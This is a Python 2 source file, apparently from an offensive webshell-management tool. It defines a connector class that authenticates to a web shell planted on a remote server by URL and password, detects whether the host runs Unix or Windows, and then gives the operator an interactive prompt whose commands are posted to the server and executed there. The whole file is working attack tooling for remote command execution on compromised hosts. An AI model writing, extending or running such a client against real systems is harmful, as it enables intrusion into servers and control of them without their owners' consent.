#!/usr/bin/env python
# encoding: utf-8

import re
from lib.core.connector import Connector

class WebShellConnector(Connector):
    """Webshell function"""

    # Constructor
    # param: url, password, server
    # return: none
    def __init__(self, url, password, server):
        Connector.__init__(self, url, password, server)
        self.osType = ''

    # Get OS type of the host
    # param: none
    # return: osType
    def setOsType(self):
        if self.server == 'asp' or self.server == 'aspx':
            self.osType = 'windows'
        else:
            self.osType = 'unix'
            os = self.runCmd('uname', '.')[0]
            if os == 'Linux' or os == 'AIX' or os == 'HP-UX' or os == 'Sun OS' or os == 'Solaris' or os == 'Mac OS X':
                pass
            else:
                self.osType = 'windows'

    # Send a command to server
    # param: cmd, pwd
    # return: result, newCmd
    def runCmd(self, cmd, pwd):
        if self.osType == '':
            self.setOsType()
        payload = self.payloader.getCmdPayload(self.osType, pwd, cmd)
        status, result = self.postToServer(payload)
        if self.osType == 'windows':
            newPwdObj = re.search(r'\[S\]\r\n.*\r\n\[E\]', result)
            newPwd = newPwdObj.group()[5:-5]
            result = result[:-len(newPwdObj.group()) - 2]
        else:
            newPwdObj = re.search(r'\[S\]\n.*\n\[E\]', result)
            newPwd = newPwdObj.group()[4:-4]
            result = result[:-len(newPwdObj.group()) - 2]
        return result, newPwd

    # The callable method to launch the connector
    # param: none
    # return: none
    def launch(self):
        try:
            if Connector.launch(self) != 'fail':
                self.setOsType()
                if self.osType == 'unix':
                    cmd = 'uname -a'
                else:
                    cmd = 'ver'
                pwd = '.'
                print '+ Connection Established'
                print ''
                while cmd != 'exit':
                    result, newPwd = self.runCmd(cmd, pwd)
                    print result
                    pwd = newPwd
                    cmd = raw_input('$ ')
            else:
                print '+ The shell script can not work properly'
        except KeyboardInterrupt:
            pass
        except AttributeError:
            print '+ Command can not run'
            print '+ Check if the password or server type is incorrect'
            print ''
        except Exception:
            print '+ Can not get shell'
            print '+ Check if the URL is incorrect'
            print ''
